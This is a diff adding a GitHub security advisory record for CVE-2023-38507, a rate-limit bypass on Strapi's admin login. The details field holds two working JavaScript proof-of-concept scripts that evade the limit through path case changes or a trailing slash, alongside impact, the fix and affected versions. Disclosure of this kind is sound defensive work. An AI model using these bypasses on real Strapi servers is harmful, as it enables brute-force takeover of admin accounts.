@@ -1,0 +1,88 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-24q2-59hm-rh9r",
+  "modified": "2023-09-13T16:32:26Z",
+  "published": "2023-09-13T16:32:26Z",
+  "aliases": [
+    "CVE-2023-38507"
+  ],
+  "summary": "Strapi Improper Rate Limiting vulnerability",
+  "details": "### 1. Summary\nThere is a rate limit on the login function of Strapi's admin screen, but it is possible to circumvent it.\n\n### 2. Details\nIt is possible to avoid this by modifying the rate-limited request path as follows.\n1. Manipulating request paths to upper or lower case. (Pattern 1)\n   - In this case, avoidance is possible with various patterns.\n2. Add path slashes to the end of the request path. (Pattern 2)\n\n### 3. PoC\nAccess the administrator's login screen (`/admin/auth/login`) and execute the following PoC on the browser's console screen.\n\n#### Pattern 1 (uppercase and lowercase)\n```js\n// poc.js\n(async () => {\n  const data1 = {\n    email: \"admin@strapi.com\",   // registered e-mail address\n    password: \"invalid_password\",\n  };\n  const data2 = {\n    email: \"admin@strapi.com\",\n    password: \"RyG5z-CE2-]*4e4\",   // correct password\n  };\n\n  for (let i = 0; i < 30; i++) {\n    await fetch(\"http://localhost:1337/admin/login\", {\n      method: \"POST\",\n      body: JSON.stringify(data1),\n      headers: {\n        \"Content-Type\": \"application/json\",\n      },\n    });\n  }\n\n  const res1 = await fetch(\"http://localhost:1337/admin/login\", {\n    method: \"POST\",\n    body: JSON.stringify(data2),\n    headers: {\n      \"Content-Type\": \"application/json\",\n    },\n  });\n  console.log(res1.status + \" \" + res1.statusText);\n\n  const res2 = await fetch(\"http://localhost:1337/admin/Login\", {  // capitalize part of path\n    method: \"POST\",\n    body: JSON.stringify(data2),\n    headers: {\n      \"Content-Type\": \"application/json\",\n    },\n  });\n  console.log(res2.status + \" \" + res2.statusText);\n})();\n```\n\n##### This PoC does the following:\n1. Request 30 incorrect logins.\n4. Execute the same request again and confirm that it is blocked by rate limit from the console screen. (`429 Too Many Requests`)\n5. Next, falsify the pathname of the request (**`/admin/Login`**) and make a request again to confirm that it is possible to bypass the rate limit and log in. (`200 OK`)\n\n#### Pattern 2 (trailing slash)\n```js\n// poc.js\n(async () => {\n  const data1 = {\n    email: \"admin@strapi.com\",   // registered e-mail address\n    password: \"invalid_password\",\n  };\n  const data2 = {\n    email: \"admin@strapi.com\",\n    password: \"RyG5z-CE2-]*4e4\",   // correct password\n  };\n\n  for (let i = 0; i < 30; i++) {\n    await fetch(\"http://localhost:1337/admin/login\", {\n      method: \"POST\",\n      body: JSON.stringify(data1),\n      headers: {\n        \"Content-Type\": \"application/json\",\n      },\n    });\n  }\n\n  const res1 = await fetch(\"http://localhost:1337/admin/login\", {\n    method: \"POST\",\n    body: JSON.stringify(data2),\n    headers: {\n      \"Content-Type\": \"application/json\",\n    },\n  });\n  console.log(res1.status + \" \" + res1.statusText);\n\n  const res2 = await fetch(\"http://localhost:1337/admin/login/\", {  // trailing slash\n    method: \"POST\",\n    body: JSON.stringify(data2),\n    headers: {\n      \"Content-Type\": \"application/json\",\n    },\n  });\n  console.log(res2.status + \" \" + res2.statusText);\n})();\n```\n\n##### This PoC does the following:\n1. Request 30 incorrect logins.\n2. Execute the same request again and confirm that it is blocked by rate limit from the console screen. (`429 Too Many Requests`)\n3. Next, falsify the pathname of the request (**`/admin/login/`**) and make a request again to confirm that it is possible to bypass the rate limit and log in. (`200 OK`)\n\n\n\n#### PoC Video\n- [PoC Video](https://drive.google.com/file/d/1UHyt6UDpl28CXjltVJmqDvSEkkJIexiB/view?usp=share_link)\n\n### 4. Impact\nIt is possible to bypass the rate limit of the login function of the admin screen. \nTherefore, the possibility of unauthorized login by login brute force attack increases.\n\n### 5. Measures\nForcibly convert the request path used for rate limiting to upper case or lower case and judge it as the same path. (`ctx.request.path`)   \nAlso, remove any extra slashes in the request path.\n\nhttps://github.com/strapi/strapi/blob/32d68f1f5677ed9a9a505b718c182c0a3f885426/packages/core/admin/server/middlewares/rateLimit.js#L31\n\n### 6. References\n- [OWASP: API2:2023 Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)\n- [OWASP: Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)\n- [OWASP: Denial of Service Cheat Sheet (Rate limiting)](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html#rate-limiting)",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@strapi/admin"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.12.1"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@strapi/plugin-users-permissions"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.12.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/strapi/strapi/security/advisories/GHSA-24q2-59hm-rh9r"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-38507"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/strapi/strapi"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/strapi/strapi/blob/32d68f1f5677ed9a9a505b718c182c0a3f885426/packages/core/admin/server/middlewares/rateLimit.js#L31"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/strapi/strapi/releases/tag/v4.12.1"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-770"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-09-13T16:32:26Z",
+    "nvd_published_at": "2023-09-15T20:15:08Z"
+  }
+}
